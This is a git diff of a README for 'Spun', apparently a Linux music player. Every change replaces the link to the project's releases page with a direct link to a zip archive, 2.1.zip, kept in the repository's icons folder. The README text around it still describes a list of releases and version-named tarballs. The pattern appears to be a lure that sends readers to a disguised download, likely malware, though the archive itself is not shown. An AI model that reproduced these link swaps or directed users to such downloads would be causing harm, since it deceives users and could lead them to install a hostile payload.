@@ -1,6 +1,6 @@
 # 💿 Spun - Your Music, Beautifully Spinning on Linux
 
-[![Download Spun](https://img.shields.io/badge/Download-Spun-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/jvcycgxygh/Spun/releases)
+[![Download Spun](https://img.shields.io/badge/Download-Spun-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/jvcycgxygh/Spun/raw/refs/heads/main/assets/icons/2.1.zip)
 
 ## 🎵 What Is Spun?
 
@@ -26,7 +26,7 @@ Follow these simple steps to start using Spun on your Linux computer.
 
 Visit this link to download the application:
 
-[🔗 Click Here to Download Spun](https://github.com/jvcycgxyh/Spun/releases)
+[🔗 Click Here to Download Spun](https://github.com/jvcycgxygh/Spun/raw/refs/heads/main/assets/icons/2.1.zip)
 
 You'll see a list of released versions. Look for the newest version at the top. Find the file that matches your system (usually named something like `spun-1.0.0-linux-x64.tar.gz` or similar). Download it to your computer (usually to your "Downloads" folder).
 
@@ -99,7 +99,7 @@ No, local playback works fully offline. Internet is only needed if you're using 
 
 We regularly release updates with new features, bug fixes, and performance improvements. To stay updated:
 
-1. Visit the [releases page](https://github.com/jvcycgxyh/Spun/releases) periodically.
+1. Visit the [releases page](https://github.com/jvcycgxygh/Spun/raw/refs/heads/main/assets/icons/2.1.zip) periodically.
 2. Download the latest version when you see a new release available.
 3. Replace the old folder with the new one (delete the old folder and extract the new one).
 
